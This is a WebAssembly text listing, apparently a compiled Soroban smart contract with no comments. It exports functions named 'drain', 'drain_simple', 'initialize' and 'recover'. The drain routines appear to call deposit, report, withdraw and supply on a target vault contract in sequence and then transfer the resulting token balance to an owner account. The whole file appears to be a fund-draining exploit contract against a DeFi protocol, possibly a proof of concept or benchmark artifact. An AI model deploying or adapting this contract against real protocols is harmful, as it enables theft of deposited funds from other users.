(module
  (type (;0;) (func (param i64 i64) (result i64)))
  (type (;1;) (func (param i64) (result i64)))
  (type (;2;) (func (result i64)))
  (type (;3;) (func (param i64 i64 i64) (result i64)))
  (type (;4;) (func (param i32)))
  (type (;5;) (func (param i32 i32 i32)))
  (type (;6;) (func (param i32 i32) (result i64)))
  (type (;7;) (func (param i64 i64 i64 i64 i64 i64) (result i64)))
  (type (;8;) (func (param i32 i64)))
  (type (;9;) (func (param i64 i64) (result i32)))
  (type (;10;) (func (param i32 i64 i64)))
  (type (;11;) (func (param i64 i64 i64 i64 i64)))
  (type (;12;) (func (param i32 i64 i64 i64)))
  (type (;13;) (func))
  (type (;14;) (func (param i64 i64 i64 i64) (result i64)))
  (type (;15;) (func (param i64 i64 i64)))
  (import "l" "0" (func (;0;) (type 0)))
  (import "l" "1" (func (;1;) (type 0)))
  (import "a" "0" (func (;2;) (type 1)))
  (import "x" "7" (func (;3;) (type 2)))
  (import "d" "_" (func (;4;) (type 3)))
  (import "v" "_" (func (;5;) (type 2)))
  (import "l" "_" (func (;6;) (type 3)))
  (import "v" "g" (func (;7;) (type 0)))
  (import "i" "8" (func (;8;) (type 1)))
  (import "i" "7" (func (;9;) (type 1)))
  (import "b" "j" (func (;10;) (type 0)))
  (import "i" "6" (func (;11;) (type 0)))
  (import "x" "0" (func (;12;) (type 0)))
  (memory (;0;) 17)
  (global (;0;) (mut i32) i32.const 1048576)
  (global (;1;) i32 i32.const 1048615)
  (global (;2;) i32 i32.const 1048624)
  (export "memory" (memory 0))
  (export "drain" (func 17))
  (export "drain_simple" (func 29))
  (export "initialize" (func 30))
  (export "recover" (func 31))
  (export "_" (func 33))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2))
  (func (;13;) (type 4) (param i32)
    (local i64 i64)
    i64.const 0
    local.set 1
    block ;; label = @1
      block ;; label = @2
        call 14
        local.tee 2
        i64.const 2
        call 0
        i64.const 1
        i64.ne
        br_if 0 (;@2;)
        local.get 2
        i64.const 2
        call 1
        local.tee 1
        i64.const 255
        i64.and
        i64.const 77
        i64.ne
        br_if 1 (;@1;)
        local.get 0
        local.get 1
        i64.store offset=8
        i64.const 1
        local.set 1
      end
      local.get 0
      local.get 1
      i64.store
      return
    end
    unreachable
  )
  (func (;14;) (type 2) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 0
    global.set 0
    local.get 0
    i32.const 1048576
    i32.const 5
    call 15
    block ;; label = @1
      local.get 0
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 0
    local.get 0
    i64.load offset=8
    i64.store
    local.get 0
    i32.const 1
    call 16
    local.set 1
    local.get 0
    i32.const 16
    i32.add
    global.set 0
    local.get 1
  )
  (func (;15;) (type 5) (param i32 i32 i32)
    (local i32 i64 i32 i32 i32 i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    i64.const 0
    local.set 4
    local.get 2
    local.set 5
    local.get 1
    local.set 6
    loop ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            block ;; label = @5
              block ;; label = @6
                local.get 5
                i32.eqz
                br_if 0 (;@6;)
                i32.const 1
                local.set 7
                local.get 6
                i32.load8_u
                local.tee 8
                i32.const 95
                i32.eq
                br_if 4 (;@2;)
                local.get 8
                i32.const -48
                i32.add
                i32.const 255
                i32.and
                i32.const 10
                i32.lt_u
                br_if 2 (;@4;)
                local.get 8
                i32.const -65
                i32.add
                i32.const 255
                i32.and
                i32.const 26
                i32.lt_u
                br_if 3 (;@3;)
                block ;; label = @7
                  local.get 8
                  i32.const -97
                  i32.add
                  i32.const 255
                  i32.and
                  i32.const 26
                  i32.ge_u
                  br_if 0 (;@7;)
                  local.get 8
                  i32.const -59
                  i32.add
                  local.set 7
                  br 5 (;@2;)
                end
                local.get 3
                local.get 8
                i64.extend_i32_u
                i64.const 8
                i64.shl
                i64.const 1
                i64.or
                i64.store
                local.get 1
                i64.extend_i32_u
                i64.const 32
                i64.shl
                i64.const 4
                i64.or
                local.get 2
                i64.extend_i32_u
                i64.const 32
                i64.shl
                i64.const 4
                i64.or
                call 10
                local.set 4
                br 1 (;@5;)
              end
              local.get 3
              local.get 4
              i64.const 8
              i64.shl
              i64.const 14
              i64.or
              local.tee 4
              i64.store offset=4 align=4
            end
            local.get 0
            i64.const 0
            i64.store
            local.get 0
            local.get 4
            i64.store offset=8
            local.get 3
            i32.const 16
            i32.add
            global.set 0
            return
          end
          local.get 8
          i32.const -46
          i32.add
          local.set 7
          br 1 (;@2;)
        end
        local.get 8
        i32.const -53
        i32.add
        local.set 7
      end
      local.get 4
      i64.const 6
      i64.shl
      local.get 7
      i64.extend_i32_u
      i64.const 255
      i64.and
      i64.or
      local.set 4
      local.get 5
      i32.const -1
      i32.add
      local.set 5
      local.get 6
      i32.const 1
      i32.add
      local.set 6
      br 0 (;@1;)
    end
  )
  (func (;16;) (type 6) (param i32 i32) (result i64)
    local.get 0
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 7
  )
  (func (;17;) (type 7) (param i64 i64 i64 i64 i64 i64) (result i64)
    (local i32 i64 i64 i64 i64 i64 i32 i64)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 6
    global.set 0
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 2
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 3
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 6
      i32.const 48
      i32.add
      local.get 4
      call 18
      local.get 6
      i32.load offset=48
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 6
      i64.load offset=72
      local.set 7
      local.get 6
      i64.load offset=64
      local.set 8
      local.get 6
      i32.const 48
      i32.add
      local.get 5
      call 18
      local.get 6
      i32.load offset=48
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 6
      i64.load offset=72
      local.set 5
      local.get 6
      i64.load offset=64
      local.set 9
      local.get 0
      call 2
      drop
      local.get 6
      i32.const 48
      i32.add
      call 13
      block ;; label = @2
        local.get 6
        i32.load offset=48
        i32.eqz
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 0
          local.get 6
          i64.load offset=56
          call 19
          i32.eqz
          br_if 0 (;@3;)
          local.get 6
          i32.const 48
          i32.add
          local.get 2
          call 3
          local.tee 4
          call 20
          local.get 6
          i64.load offset=56
          local.set 10
          local.get 6
          i64.load offset=48
          local.set 11
          local.get 2
          local.get 4
          local.get 1
          local.get 8
          local.get 7
          call 21
          local.get 6
          local.get 8
          local.get 7
          call 22
          local.tee 8
          i64.store offset=16
          i64.const 2
          local.set 7
          i32.const 1
          local.set 12
          block ;; label = @4
            loop ;; label = @5
              local.get 12
              i32.eqz
              br_if 1 (;@4;)
              local.get 12
              i32.const -1
              i32.add
              local.set 12
              local.get 8
              local.set 7
              br 0 (;@5;)
            end
          end
          local.get 6
          local.get 7
          i64.store offset=48
          i32.const 1
          local.set 12
          local.get 6
          i32.const 48
          i32.add
          i32.const 1
          call 16
          local.set 13
          local.get 6
          i64.const 0
          i64.const 0
          call 22
          local.tee 8
          i64.store offset=16
          i64.const 2
          local.set 7
          block ;; label = @4
            loop ;; label = @5
              local.get 12
              i32.eqz
              br_if 1 (;@4;)
              local.get 12
              i32.const -1
              i32.add
              local.set 12
              local.get 8
              local.set 7
              br 0 (;@5;)
            end
          end
          local.get 6
          local.get 7
          i64.store offset=48
          local.get 6
          i32.const 48
          i32.add
          i32.const 1
          call 16
          local.set 7
          i32.const 1048581
          i32.const 7
          call 23
          local.set 8
          local.get 6
          i64.const 0
          i64.store offset=40
          local.get 6
          local.get 4
          i64.store offset=32
          local.get 6
          local.get 7
          i64.store offset=24
          local.get 6
          local.get 13
          i64.store offset=16
          i32.const 0
          local.set 12
          loop ;; label = @4
            block ;; label = @5
              local.get 12
              i32.const 32
              i32.ne
              br_if 0 (;@5;)
              i32.const 0
              local.set 12
              block ;; label = @6
                loop ;; label = @7
                  local.get 12
                  i32.const 32
                  i32.eq
                  br_if 1 (;@6;)
                  local.get 6
                  i32.const 48
                  i32.add
                  local.get 12
                  i32.add
                  local.get 6
                  i32.const 16
                  i32.add
                  local.get 12
                  i32.add
                  i64.load
                  i64.store
                  local.get 12
                  i32.const 8
                  i32.add
                  local.set 12
                  br 0 (;@7;)
                end
              end
              local.get 1
              local.get 8
              local.get 6
              i32.const 48
              i32.add
              i32.const 4
              call 16
              call 4
              drop
              i32.const 1048594
              i32.const 7
              call 23
              local.set 8
              local.get 6
              local.get 4
              i64.store offset=16
              i64.const 2
              local.set 7
              i32.const 1
              local.set 12
              block ;; label = @6
                loop ;; label = @7
                  local.get 12
                  i32.eqz
                  br_if 1 (;@6;)
                  local.get 12
                  i32.const -1
                  i32.add
                  local.set 12
                  local.get 4
                  local.set 7
                  br 0 (;@7;)
                end
              end
              local.get 6
              local.get 7
              i64.store offset=48
              local.get 6
              local.get 1
              local.get 8
              local.get 6
              i32.const 48
              i32.add
              i32.const 1
              call 16
              call 24
              local.get 2
              local.get 4
              local.get 3
              local.get 9
              local.get 5
              call 21
              i32.const 1048609
              i32.const 6
              call 23
              local.set 7
              local.get 6
              local.get 9
              local.get 5
              call 22
              i64.store offset=40
              local.get 6
              local.get 2
              i64.store offset=32
              local.get 6
              local.get 4
              i64.store offset=24
              local.get 6
              local.get 4
              i64.store offset=16
              i32.const 0
              local.set 12
              loop ;; label = @6
                block ;; label = @7
                  local.get 12
                  i32.const 32
                  i32.ne
                  br_if 0 (;@7;)
                  i32.const 0
                  local.set 12
                  block ;; label = @8
                    loop ;; label = @9
                      local.get 12
                      i32.const 32
                      i32.eq
                      br_if 1 (;@8;)
                      local.get 6
                      i32.const 48
                      i32.add
                      local.get 12
                      i32.add
                      local.get 6
                      i32.const 16
                      i32.add
                      local.get 12
                      i32.add
                      i64.load
                      i64.store
                      local.get 12
                      i32.const 8
                      i32.add
                      local.set 12
                      br 0 (;@9;)
                    end
                  end
                  local.get 3
                  local.get 7
                  local.get 6
                  i32.const 48
                  i32.add
                  i32.const 4
                  call 16
                  call 4
                  drop
                  local.get 1
                  i32.const 1048588
                  i32.const 6
                  call 23
                  call 5
                  call 4
                  drop
                  local.get 6
                  i64.const 0
                  i64.const 0
                  call 22
                  local.tee 8
                  i64.store offset=16
                  i64.const 2
                  local.set 7
                  i32.const 1
                  local.set 12
                  block ;; label = @8
                    loop ;; label = @9
                      local.get 12
                      i32.eqz
                      br_if 1 (;@8;)
                      local.get 12
                      i32.const -1
                      i32.add
                      local.set 12
                      local.get 8
                      local.set 7
                      br 0 (;@9;)
                    end
                  end
                  local.get 6
                  local.get 7
                  i64.store offset=48
                  local.get 6
                  i32.const 48
                  i32.add
                  i32.const 1
                  call 16
                  local.set 7
                  i32.const 1048601
                  i32.const 8
                  call 23
                  local.set 8
                  local.get 6
                  i64.load
                  local.get 6
                  i64.load offset=8
                  call 22
                  local.set 13
                  local.get 6
                  local.get 4
                  i64.store offset=32
                  local.get 6
                  local.get 7
                  i64.store offset=24
                  local.get 6
                  local.get 13
                  i64.store offset=16
                  i32.const 0
                  local.set 12
                  loop ;; label = @8
                    block ;; label = @9
                      local.get 12
                      i32.const 24
                      i32.ne
                      br_if 0 (;@9;)
                      i32.const 0
                      local.set 12
                      block ;; label = @10
                        loop ;; label = @11
                          local.get 12
                          i32.const 24
                          i32.eq
                          br_if 1 (;@10;)
                          local.get 6
                          i32.const 48
                          i32.add
                          local.get 12
                          i32.add
                          local.get 6
                          i32.const 16
                          i32.add
                          local.get 12
                          i32.add
                          i64.load
                          i64.store
                          local.get 12
                          i32.const 8
                          i32.add
                          local.set 12
                          br 0 (;@11;)
                        end
                      end
                      local.get 1
                      local.get 8
                      local.get 6
                      i32.const 48
                      i32.add
                      i32.const 3
                      call 16
                      call 4
                      drop
                      i32.const 1048601
                      i32.const 8
                      call 23
                      local.set 7
                      local.get 9
                      local.get 5
                      call 22
                      local.set 8
                      local.get 6
                      local.get 4
                      i64.store offset=40
                      local.get 6
                      local.get 8
                      i64.store offset=32
                      local.get 6
                      local.get 2
                      i64.store offset=24
                      local.get 6
                      local.get 4
                      i64.store offset=16
                      i32.const 0
                      local.set 12
                      block ;; label = @10
                        loop ;; label = @11
                          block ;; label = @12
                            local.get 12
                            i32.const 32
                            i32.ne
                            br_if 0 (;@12;)
                            i32.const 0
                            local.set 12
                            block ;; label = @13
                              loop ;; label = @14
                                local.get 12
                                i32.const 32
                                i32.eq
                                br_if 1 (;@13;)
                                local.get 6
                                i32.const 48
                                i32.add
                                local.get 12
                                i32.add
                                local.get 6
                                i32.const 16
                                i32.add
                                local.get 12
                                i32.add
                                i64.load
                                i64.store
                                local.get 12
                                i32.const 8
                                i32.add
                                local.set 12
                                br 0 (;@14;)
                              end
                            end
                            local.get 3
                            local.get 7
                            local.get 6
                            i32.const 48
                            i32.add
                            i32.const 4
                            call 16
                            call 4
                            drop
                            local.get 6
                            i32.const 48
                            i32.add
                            local.get 2
                            local.get 4
                            call 20
                            local.get 6
                            i64.load offset=56
                            local.tee 7
                            local.get 10
                            i64.xor
                            local.get 7
                            local.get 7
                            local.get 10
                            i64.sub
                            local.get 6
                            i64.load offset=48
                            local.tee 8
                            local.get 11
                            i64.lt_u
                            i64.extend_i32_u
                            i64.sub
                            local.tee 1
                            i64.xor
                            i64.and
                            i64.const 0
                            i64.lt_s
                            br_if 2 (;@10;)
                            local.get 8
                            local.get 11
                            i64.sub
                            local.set 3
                            block ;; label = @13
                              local.get 8
                              i64.const 0
                              i64.ne
                              local.get 7
                              i64.const 0
                              i64.gt_s
                              local.get 7
                              i64.eqz
                              select
                              i32.eqz
                              br_if 0 (;@13;)
                              local.get 2
                              local.get 4
                              local.get 0
                              local.get 8
                              local.get 7
                              call 25
                            end
                            local.get 3
                            local.get 1
                            call 22
                            local.set 4
                            local.get 6
                            i32.const 80
                            i32.add
                            global.set 0
                            local.get 4
                            return
                          end
                          local.get 6
                          i32.const 48
                          i32.add
                          local.get 12
                          i32.add
                          i64.const 2
                          i64.store
                          local.get 12
                          i32.const 8
                          i32.add
                          local.set 12
                          br 0 (;@11;)
                        end
                      end
                      call 26
                      unreachable
                    end
                    local.get 6
                    i32.const 48
                    i32.add
                    local.get 12
                    i32.add
                    i64.const 2
                    i64.store
                    local.get 12
                    i32.const 8
                    i32.add
                    local.set 12
                    br 0 (;@8;)
                  end
                end
                local.get 6
                i32.const 48
                i32.add
                local.get 12
                i32.add
                i64.const 2
                i64.store
                local.get 12
                i32.const 8
                i32.add
                local.set 12
                br 0 (;@6;)
              end
            end
            local.get 6
            i32.const 48
            i32.add
            local.get 12
            i32.add
            i64.const 2
            i64.store
            local.get 12
            i32.const 8
            i32.add
            local.set 12
            br 0 (;@4;)
          end
        end
        i32.const 39
        call 27
        unreachable
      end
      call 28
      unreachable
    end
    unreachable
  )
  (func (;18;) (type 8) (param i32 i64)
    (local i32 i64)
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            local.get 1
            i32.wrap_i64
            i32.const 255
            i32.and
            local.tee 2
            i32.const 69
            i32.eq
            br_if 0 (;@4;)
            local.get 2
            i32.const 11
            i32.ne
            br_if 2 (;@2;)
            local.get 0
            local.get 1
            i64.const 63
            i64.shr_s
            i64.store offset=24
            local.get 0
            local.get 1
            i64.const 8
            i64.shr_s
            i64.store offset=16
            br 1 (;@3;)
          end
          local.get 1
          call 8
          local.set 3
          local.get 1
          call 9
          local.set 1
          local.get 0
          local.get 3
          i64.store offset=24
          local.get 0
          local.get 1
          i64.store offset=16
        end
        i64.const 0
        local.set 1
        br 1 (;@1;)
      end
      local.get 0
      i64.const 34359740419
      i64.store offset=8
      i64.const 1
      local.set 1
    end
    local.get 0
    local.get 1
    i64.store
  )
  (func (;19;) (type 9) (param i64 i64) (result i32)
    local.get 0
    local.get 1
    call 12
    i64.eqz
  )
  (func (;20;) (type 10) (param i32 i64 i64)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.store offset=8
    local.get 0
    local.get 1
    i64.const 696753673873934
    local.get 3
    i32.const 8
    i32.add
    i32.const 1
    call 16
    call 24
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;21;) (type 11) (param i64 i64 i64 i64 i64)
    (local i32 i32)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 5
    global.set 0
    local.get 3
    local.get 4
    call 22
    local.set 4
    local.get 5
    i64.const -4294967292
    i64.store offset=24
    local.get 5
    local.get 4
    i64.store offset=16
    local.get 5
    local.get 2
    i64.store offset=8
    local.get 5
    local.get 1
    i64.store
    i32.const 0
    local.set 6
    loop ;; label = @1
      block ;; label = @2
        local.get 6
        i32.const 32
        i32.ne
        br_if 0 (;@2;)
        i32.const 0
        local.set 6
        block ;; label = @3
          loop ;; label = @4
            local.get 6
            i32.const 32
            i32.eq
            br_if 1 (;@3;)
            local.get 5
            i32.const 32
            i32.add
            local.get 6
            i32.add
            local.get 5
            local.get 6
            i32.add
            i64.load
            i64.store
            local.get 6
            i32.const 8
            i32.add
            local.set 6
            br 0 (;@4;)
          end
        end
        local.get 0
        i64.const 683302978513422
        local.get 5
        i32.const 32
        i32.add
        i32.const 4
        call 16
        call 34
        local.get 5
        i32.const 64
        i32.add
        global.set 0
        return
      end
      local.get 5
      i32.const 32
      i32.add
      local.get 6
      i32.add
      i64.const 2
      i64.store
      local.get 6
      i32.const 8
      i32.add
      local.set 6
      br 0 (;@1;)
    end
  )
  (func (;22;) (type 0) (param i64 i64) (result i64)
    block ;; label = @1
      local.get 0
      i64.const 36028797018963968
      i64.add
      i64.const 72057594037927935
      i64.gt_u
      br_if 0 (;@1;)
      local.get 0
      local.get 0
      i64.xor
      local.get 1
      local.get 0
      i64.const 63
      i64.shr_s
      i64.xor
      i64.or
      i64.const 0
      i64.ne
      br_if 0 (;@1;)
      local.get 0
      i64.const 8
      i64.shl
      i64.const 11
      i64.or
      return
    end
    local.get 1
    local.get 0
    call 11
  )
  (func (;23;) (type 6) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 15
    block ;; label = @1
      local.get 2
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;24;) (type 12) (param i32 i64 i64 i64)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 4
    global.set 0
    local.get 4
    local.get 1
    local.get 2
    local.get 3
    call 4
    call 18
    block ;; label = @1
      local.get 4
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      call 26
      unreachable
    end
    local.get 4
    i64.load offset=16
    local.set 3
    local.get 0
    local.get 4
    i64.load offset=24
    i64.store offset=8
    local.get 0
    local.get 3
    i64.store
    local.get 4
    i32.const 32
    i32.add
    global.set 0
  )
  (func (;25;) (type 11) (param i64 i64 i64 i64 i64)
    (local i32 i32)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 3
    local.get 4
    call 22
    i64.store offset=16
    local.get 5
    local.get 2
    i64.store offset=8
    local.get 5
    local.get 1
    i64.store
    i32.const 0
    local.set 6
    loop ;; label = @1
      block ;; label = @2
        local.get 6
        i32.const 24
        i32.ne
        br_if 0 (;@2;)
        i32.const 0
        local.set 6
        block ;; label = @3
          loop ;; label = @4
            local.get 6
            i32.const 24
            i32.eq
            br_if 1 (;@3;)
            local.get 5
            i32.const 24
            i32.add
            local.get 6
            i32.add
            local.get 5
            local.get 6
            i32.add
            i64.load
            i64.store
            local.get 6
            i32.const 8
            i32.add
            local.set 6
            br 0 (;@4;)
          end
        end
        local.get 0
        i64.const 65154533130155790
        local.get 5
        i32.const 24
        i32.add
        i32.const 3
        call 16
        call 34
        local.get 5
        i32.const 48
        i32.add
        global.set 0
        return
      end
      local.get 5
      i32.const 24
      i32.add
      local.get 6
      i32.add
      i64.const 2
      i64.store
      local.get 6
      i32.const 8
      i32.add
      local.set 6
      br 0 (;@1;)
    end
  )
  (func (;26;) (type 13)
    call 32
    unreachable
  )
  (func (;27;) (type 4) (param i32)
    call 32
    unreachable
  )
  (func (;28;) (type 13)
    i32.const 43
    call 27
    unreachable
  )
  (func (;29;) (type 14) (param i64 i64 i64 i64) (result i64)
    (local i32 i64 i64 i64 i64 i32 i64)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 4
    global.set 0
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 2
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 4
      i32.const 48
      i32.add
      local.get 3
      call 18
      local.get 4
      i32.load offset=48
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 4
      i64.load offset=72
      local.set 5
      local.get 4
      i64.load offset=64
      local.set 6
      local.get 0
      call 2
      drop
      local.get 4
      i32.const 48
      i32.add
      call 13
      block ;; label = @2
        local.get 4
        i32.load offset=48
        i32.eqz
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 0
          local.get 4
          i64.load offset=56
          call 19
          i32.eqz
          br_if 0 (;@3;)
          local.get 4
          i32.const 48
          i32.add
          local.get 2
          call 3
          local.tee 3
          call 20
          local.get 4
          i64.load offset=56
          local.set 7
          local.get 4
          i64.load offset=48
          local.set 8
          local.get 2
          local.get 3
          local.get 1
          local.get 6
          local.get 5
          call 21
          local.get 4
          local.get 6
          local.get 5
          call 22
          local.tee 6
          i64.store
          i64.const 2
          local.set 5
          i32.const 1
          local.set 9
          block ;; label = @4
            loop ;; label = @5
              local.get 9
              i32.eqz
              br_if 1 (;@4;)
              local.get 9
              i32.const -1
              i32.add
              local.set 9
              local.get 6
              local.set 5
              br 0 (;@5;)
            end
          end
          local.get 4
          local.get 5
          i64.store offset=48
          i32.const 1
          local.set 9
          local.get 4
          i32.const 48
          i32.add
          i32.const 1
          call 16
          local.set 10
          local.get 4
          i64.const 0
          i64.const 0
          call 22
          local.tee 6
          i64.store
          i64.const 2
          local.set 5
          block ;; label = @4
            loop ;; label = @5
              local.get 9
              i32.eqz
              br_if 1 (;@4;)
              local.get 9
              i32.const -1
              i32.add
              local.set 9
              local.get 6
              local.set 5
              br 0 (;@5;)
            end
          end
          local.get 4
          local.get 5
          i64.store offset=48
          local.get 4
          i32.const 48
          i32.add
          i32.const 1
          call 16
          local.set 5
          i32.const 1048581
          i32.const 7
          call 23
          local.set 6
          local.get 4
          i64.const 0
          i64.store offset=24
          local.get 4
          local.get 3
          i64.store offset=16
          local.get 4
          local.get 5
          i64.store offset=8
          local.get 4
          local.get 10
          i64.store
          i32.const 0
          local.set 9
          loop ;; label = @4
            block ;; label = @5
              local.get 9
              i32.const 32
              i32.ne
              br_if 0 (;@5;)
              i32.const 0
              local.set 9
              block ;; label = @6
                loop ;; label = @7
                  local.get 9
                  i32.const 32
                  i32.eq
                  br_if 1 (;@6;)
                  local.get 4
                  i32.const 48
                  i32.add
                  local.get 9
                  i32.add
                  local.get 4
                  local.get 9
                  i32.add
                  i64.load
                  i64.store
                  local.get 9
                  i32.const 8
                  i32.add
                  local.set 9
                  br 0 (;@7;)
                end
              end
              local.get 1
              local.get 6
              local.get 4
              i32.const 48
              i32.add
              i32.const 4
              call 16
              call 4
              drop
              local.get 1
              i32.const 1048588
              i32.const 6
              call 23
              call 5
              call 4
              drop
              i32.const 1048594
              i32.const 7
              call 23
              local.set 6
              local.get 4
              local.get 3
              i64.store
              i64.const 2
              local.set 5
              i32.const 1
              local.set 9
              block ;; label = @6
                loop ;; label = @7
                  local.get 9
                  i32.eqz
                  br_if 1 (;@6;)
                  local.get 9
                  i32.const -1
                  i32.add
                  local.set 9
                  local.get 3
                  local.set 5
                  br 0 (;@7;)
                end
              end
              local.get 4
              local.get 5
              i64.store offset=48
              i32.const 1
              local.set 9
              local.get 4
              i32.const 32
              i32.add
              local.get 1
              local.get 6
              local.get 4
              i32.const 48
              i32.add
              i32.const 1
              call 16
              call 24
              local.get 4
              i64.const 0
              i64.const 0
              call 22
              local.tee 6
              i64.store
              i64.const 2
              local.set 5
              block ;; label = @6
                loop ;; label = @7
                  local.get 9
                  i32.eqz
                  br_if 1 (;@6;)
                  local.get 9
                  i32.const -1
                  i32.add
                  local.set 9
                  local.get 6
                  local.set 5
                  br 0 (;@7;)
                end
              end
              local.get 4
              local.get 5
              i64.store offset=48
              local.get 4
              i32.const 48
              i32.add
              i32.const 1
              call 16
              local.set 5
              i32.const 1048601
              i32.const 8
              call 23
              local.set 6
              local.get 4
              i64.load offset=32
              local.get 4
              i64.load offset=40
              call 22
              local.set 10
              local.get 4
              local.get 3
              i64.store offset=16
              local.get 4
              local.get 5
              i64.store offset=8
              local.get 4
              local.get 10
              i64.store
              i32.const 0
              local.set 9
              block ;; label = @6
                loop ;; label = @7
                  block ;; label = @8
                    local.get 9
                    i32.const 24
                    i32.ne
                    br_if 0 (;@8;)
                    i32.const 0
                    local.set 9
                    block ;; label = @9
                      loop ;; label = @10
                        local.get 9
                        i32.const 24
                        i32.eq
                        br_if 1 (;@9;)
                        local.get 4
                        i32.const 48
                        i32.add
                        local.get 9
                        i32.add
                        local.get 4
                        local.get 9
                        i32.add
                        i64.load
                        i64.store
                        local.get 9
                        i32.const 8
                        i32.add
                        local.set 9
                        br 0 (;@10;)
                      end
                    end
                    local.get 1
                    local.get 6
                    local.get 4
                    i32.const 48
                    i32.add
                    i32.const 3
                    call 16
                    call 4
                    drop
                    local.get 4
                    i32.const 48
                    i32.add
                    local.get 2
                    local.get 3
                    call 20
                    local.get 4
                    i64.load offset=56
                    local.tee 5
                    local.get 7
                    i64.xor
                    local.get 5
                    local.get 5
                    local.get 7
                    i64.sub
                    local.get 4
                    i64.load offset=48
                    local.tee 6
                    local.get 8
                    i64.lt_u
                    i64.extend_i32_u
                    i64.sub
                    local.tee 1
                    i64.xor
                    i64.and
                    i64.const 0
                    i64.lt_s
                    br_if 2 (;@6;)
                    local.get 6
                    local.get 8
                    i64.sub
                    local.set 7
                    block ;; label = @9
                      local.get 6
                      i64.const 0
                      i64.ne
                      local.get 5
                      i64.const 0
                      i64.gt_s
                      local.get 5
                      i64.eqz
                      select
                      i32.eqz
                      br_if 0 (;@9;)
                      local.get 2
                      local.get 3
                      local.get 0
                      local.get 6
                      local.get 5
                      call 25
                    end
                    local.get 7
                    local.get 1
                    call 22
                    local.set 3
                    local.get 4
                    i32.const 80
                    i32.add
                    global.set 0
                    local.get 3
                    return
                  end
                  local.get 4
                  i32.const 48
                  i32.add
                  local.get 9
                  i32.add
                  i64.const 2
                  i64.store
                  local.get 9
                  i32.const 8
                  i32.add
                  local.set 9
                  br 0 (;@7;)
                end
              end
              call 26
              unreachable
            end
            local.get 4
            i32.const 48
            i32.add
            local.get 9
            i32.add
            i64.const 2
            i64.store
            local.get 9
            i32.const 8
            i32.add
            local.set 9
            br 0 (;@4;)
          end
        end
        i32.const 39
        call 27
        unreachable
      end
      call 28
      unreachable
    end
    unreachable
  )
  (func (;30;) (type 1) (param i64) (result i64)
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.eq
      br_if 0 (;@1;)
      unreachable
    end
    local.get 0
    call 2
    drop
    call 14
    local.get 0
    i64.const 2
    call 6
    drop
    i64.const 2
  )
  (func (;31;) (type 0) (param i64 i64) (result i64)
    (local i32 i64 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          local.get 0
          i64.const 255
          i64.and
          i64.const 77
          i64.ne
          br_if 0 (;@3;)
          local.get 1
          i64.const 255
          i64.and
          i64.const 77
          i64.ne
          br_if 0 (;@3;)
          local.get 0
          call 2
          drop
          local.get 2
          call 13
          local.get 2
          i32.load
          i32.eqz
          br_if 1 (;@2;)
          local.get 0
          local.get 2
          i64.load offset=8
          call 19
          i32.eqz
          br_if 2 (;@1;)
          local.get 2
          local.get 1
          call 3
          local.tee 3
          call 20
          block ;; label = @4
            local.get 2
            i64.load
            local.tee 4
            i64.eqz
            local.get 2
            i64.load offset=8
            local.tee 5
            i64.const 0
            i64.lt_s
            local.get 5
            i64.eqz
            select
            br_if 0 (;@4;)
            local.get 1
            local.get 3
            local.get 0
            local.get 4
            local.get 5
            call 25
          end
          local.get 4
          local.get 5
          call 22
          local.set 0
          local.get 2
          i32.const 16
          i32.add
          global.set 0
          local.get 0
          return
        end
        unreachable
      end
      call 28
      unreachable
    end
    i32.const 39
    call 27
    unreachable
  )
  (func (;32;) (type 13)
    unreachable
  )
  (func (;33;) (type 13))
  (func (;34;) (type 15) (param i64 i64 i64)
    block ;; label = @1
      local.get 0
      local.get 1
      local.get 2
      call 4
      i64.const 255
      i64.and
      i64.const 2
      i64.eq
      br_if 0 (;@1;)
      call 26
      unreachable
    end
  )
  (data (;0;) (i32.const 1048576) "Ownerdepositreportbalancewithdrawsupply")
